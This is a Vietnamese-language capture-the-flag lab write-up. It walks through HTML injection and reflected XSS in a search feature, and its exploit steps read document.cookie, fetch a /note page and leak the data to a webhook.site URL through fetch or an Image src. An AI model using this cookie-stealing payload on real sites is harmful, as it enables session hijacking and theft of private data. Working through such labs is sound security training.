# LAB

# 1. Lab 1 #

<img width="551" height="98" alt="image" src="https://github.com/user-attachments/assets/1d741500-aa61-42b1-9c78-6f3b9ec430df" />

Khi thử chức năng search, ta thấy đoạn text được tự động in đậm

Điều này là bởi vì trong source code, đoạn text được kẹp trong tag `<b>` có tác dụng in đậm đoạn text trong 

<img width="664" height="142" alt="image" src="https://github.com/user-attachments/assets/4b493355-acbc-41a0-83cd-1636c0cefe51" />


Vậy response trả về sẽ được render html


Ta thử dùng tag `<h1>` : `<h1>search something</h1>`

<img width="227" height="112" alt="image" src="https://github.com/user-attachments/assets/4f906c85-1004-482c-901c-ab7f69eba244" />

--> Tag html đã được render thành công

Thành công HTML Injection

Ta thử tiếp với alert `<script>alert(origin)</script>`

<img width="722" height="185" alt="image" src="https://github.com/user-attachments/assets/15a2fa55-67ad-4f7d-8c9e-9c362c194f57" />

Để lấy được flag, thì ta cần đọc được document cookie, sử dụng phiên đăng nhập đó của owner để đọc ở trang note

Ta sẽ đẩy cookie đó qua một server trung gian rồi bắt HTTP response

Với `<script>alert(document.cookie)</script>` để lấy thông tin 

<img width="674" height="183" alt="image" src="https://github.com/user-attachments/assets/9c24b962-c2d2-4851-a383-84202b9a22ee" />

# Các bước exploit

## Bước 1: HTML Injection
## Bước 2: HTML Injection chạy những tag JavaScript để trộm cookie hoặc fetch trang page/note về ( vì page này chứa flag )

Đọc document cookie:
```data=document.cookie```

fetch('/note')
  .then(response => response.text()) 
  .then(data => console.log(data)) ;
  
## Bước 3: Dùng chính JavaScript để leak data ra ngoài Internet ( Sử dụng webhook.site )

Cách 1: để leak data ra:  dùng chính fetch API để gửi HTTP request kèm data leak đến webhook 




Cách 2: tạo ra 1 tấm ảnh và gán đường dẫn là webhook 

```
data_leak = document.cookie
anh = new Image(); 
anh.src="https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak="+data_leak
```





# NOTE



